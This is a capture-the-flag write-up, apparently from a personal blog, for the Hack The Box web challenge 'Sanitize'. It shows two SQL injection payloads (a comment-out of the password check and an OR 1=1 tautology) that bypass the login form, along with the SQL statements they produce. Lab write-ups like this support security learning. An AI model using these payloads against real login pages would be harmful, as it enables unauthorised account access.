---
title: "HTB: Sanitize"
header.image: "/assets/images/avatar_black.png"
#last_modified_at: 2021-11-08T21:19:00+01:00
categories:
  - HTB
tags:
  - Easy-Challenge
  - Web
  - OWASP Top 10
  - SQLi
---

# Quick summary
Really easy challenge containing `SQLi` (SQL Injection) where the SQL Statement is visible on the webpage.

## Description
> Can you escape the query context and log in as admin at my super secure login page?

# Enumeration

Visiting the website:
![Startpage](/assets/htb/sanitize/startpage.png)

Checking the Source Code reveals that the title being `SQLi` meaning `SQL Injection`.<br>
![Startpage Title](/assets/htb/sanitize/startpage_header.png)

Trying to login using `admin`:`admin` reveals a meme and the full SQL statement at the bottom of the page:
![Think outside the box meme](/assets/htb/sanitize/think_outside_box.png)

# Exploit

Since the full SQL statement can be seen on the page it's easy to get the payload right.

## Payload 1
username: `admin' -- -`<br>
password: `a`

SQL Statement becomes:
```sql
SELECT * FROM users WHERE username = 'admin'-- - and password = a
```
The SQL statement controls that the username is `admin` and the password part is commented out, meaning all that's needed is a correct username.

## Payload 2
If the username is unknown, the following payload can be used instead:

username: `eplots' OR 1=1;-- -`<br>
password: `a`

SQL Statement becomes:
```sql
SELECT * FROM users WHERE username = 'eplots' OR 1=1;-- - AND password = 'a'
```

# Pwned confirmation
![Pwned confirmation](/assets/htb/sanitize/sanitize_pwned.png)